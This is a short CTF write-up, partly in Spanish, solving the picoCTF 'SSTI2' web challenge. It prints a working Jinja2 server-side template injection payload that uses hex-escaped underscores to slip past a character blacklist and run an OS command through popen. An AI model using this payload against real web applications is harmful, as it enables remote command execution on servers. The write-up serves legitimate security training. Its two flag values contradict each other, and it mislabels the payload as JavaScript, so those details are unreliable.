#Software #Hacking #WebExplotation #Web #Internet 
Hecho por: [[Briseida Guzmán Ramírez]]
# Definición
I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)I heard templating is a cool and modular way to build web apps! Check out my website [here](http://shape-facility.picoctf.net:58834/)!
# Hints
- Server Side Template Injection
- Why is blacklisting characters a bad idea to sanitize input?
# Solución
Entramos a la pagina web e ingresamos en el cuadro de texto esto (hacemos un request de [[Javascript]])

```javascript
{{ request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')() }}
```
picoCTF{sst1_f1lt3r_byp4ss_eb2a60e7}
Flag: picoCTF{sst1f1lt3rbyp4sse964f71b}
>//Link de ayuda [https://aathilducky.com/ssti2-picoctf-walkthrough-web-exploitation-challenge-guide/](https://aathilducky.com/ssti2-picoctf-walkthrough-web-exploitation-challenge-guide/)
## Respuesta
picoCTF{sst1_f1lt3r_byp4ss_eb2a60e7}